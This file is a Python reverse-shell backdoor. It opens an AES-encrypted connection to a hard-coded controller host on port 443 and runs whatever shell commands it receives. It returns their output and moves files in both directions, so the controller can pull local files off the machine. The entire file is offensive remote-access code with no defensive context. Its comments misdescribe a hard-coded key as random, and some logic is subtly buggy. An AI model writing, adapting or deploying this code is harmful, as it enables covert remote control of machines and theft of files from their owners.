from Crypto.Cipher import AES
import subprocess,socket
import base64
import time
import os
import sys,select

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 16

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJHsjkdjklfs9aR"

# create a cipher object using the random secret
cipher = AES.new(secret)



#Server Config
HOST = "192.168.1.9"
PORT = 443


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
active = False

# main loop 
while True:
	data = s.recv(1024)
	decrypted = DecodeAES(cipher, data)
	
	time.sleep(0.8)
	success = EncodeAES(cipher, 'Success! We made it! EOFEOFEOFEOFEOFX')
	s.send(success)
	active = True
   	 # active
	while active:
		# this data is now encrypted 
		data = s.recv(1024)
		# decrypt data
		decrypted = DecodeAES(cipher, data)
		# check for out
		if not decrypted.find("quit") : 
			sendData = 'Exit. \n EOFEOFEOFEOFEOFX'
			crptData = EncodeAES(cipher,sendData)
			s.send(crptData)
			active = False
			break 				
		elif decrypted.startswith('download') == True:
			# set file name 
			sendfile = decrypted[9:]	
			# file transfer
			with open(sendfile, 'rb') as f:
				while 1:
					fileData = f.read()
					if fileData == '':break
					# send file
					s.sendall(fileData)
			f.close()
			time.sleep(0.8)			
			# let server know we're done
			s.sendall('EOFEOFEOFEOFEOFX')
			time.sleep(0.8)
			s.sendall(EncodeAES(cipher, 'Finished download'))
		elif decrypted.startswith('upload') == True:
			
			# set the file name 
			downFile = decrypted[7:]
			
			# file transfer
			g = open(downFile, 'wb')
		
			# download file 
			while True:
				d = s.recv(1024)
				while (d):
					if d.endswith("EOFEOFEOFEOFEOFX"):
						u = d [:-16]
						g.write(u)
						break
					else :
						g.write(d)
						d = s.recv(1024)
				break
			g.close()

		else :
			# execute command
			proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				
			# save output/error
			stdoutput = proc.stdout.read() + proc.stderr.read()
				
			# encrypt output
			encrypted = EncodeAES(cipher, stdoutput)
				
			# send encrypted output
			s.send(encrypted,AES.MODE_CFB)
			
# exit the loop
s.send(EncodeAES(cipher,'Bye now.'))
s.close()


